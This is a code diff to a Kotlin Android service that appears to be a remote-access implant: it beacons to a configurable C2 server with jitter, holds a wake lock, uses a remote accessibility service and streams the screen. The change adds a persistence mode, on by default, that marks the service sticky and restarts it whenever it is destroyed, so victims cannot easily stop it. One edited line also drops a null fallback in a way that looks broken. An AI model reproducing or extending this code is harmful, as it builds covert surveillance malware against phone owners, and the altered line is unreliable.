@@ -62,6 +62,7 @@ const val BEACON_INTERVAL = 30000L
 const val JITTER_PERCENT = 0.2
 const val PREFS_NAME = "agent_config"
 const val KEY_C2_SERVER = "c2_server"
+const val KEY_PERSISTENT = "persistent_mode"
 
 class AgentService : Service() {
 
@@ -85,6 +86,7 @@ class AgentService : Service() {
     private var quality = 70
     private var scale = 1.0f
     private var remoteAccessibilityService: RemoteAccessibilityService? = null
+    private var persistentMode = true
 
     inner class LocalBinder : Binder() {
         fun getService(): AgentService = this@AgentService
@@ -92,16 +94,23 @@ class AgentService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        loadConfig()
         acquireWakeLock()
         initCrypto()
         registerCapabilities()
         running = true
         thread(name = "agent-beacon") { beaconLoop() }
+        Log.d("AgentService", "Service created, persistentMode=$persistentMode")
+    }
+
+    private fun loadConfig() {
+        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
+        persistentMode = prefs.getBoolean(KEY_PERSISTENT, true)
     }
 
     private fun getC2Server(): String {
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
-        return prefs.getString(KEY_C2_SERVER, DEFAULT_C2_SERVER) ?: DEFAULT_C2_SERVER
+        return prefs.getString(KEY_C2_SERVER, DEFAULT_C2_SERVER)
     }
 
     private fun acquireWakeLock() {
@@ -293,11 +302,24 @@ class AgentService : Service() {
     }
 
     override fun onBind(intent: Intent): IBinder = binder
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (persistentMode) {
+            return START_STICKY
+        }
+        return START_NOT_STICKY
+    }
+
     override fun onDestroy() {
         running = false
         wakeLock?.release()
         capabilities.values.forEach { it.cleanup() }
         stopStream()
+        // Restart service if persistent mode
+        if (persistentMode) {
+            val restartIntent = Intent(this, AgentService::class.java)
+            startService(restartIntent)
+        }
         super.onDestroy()
     }
 
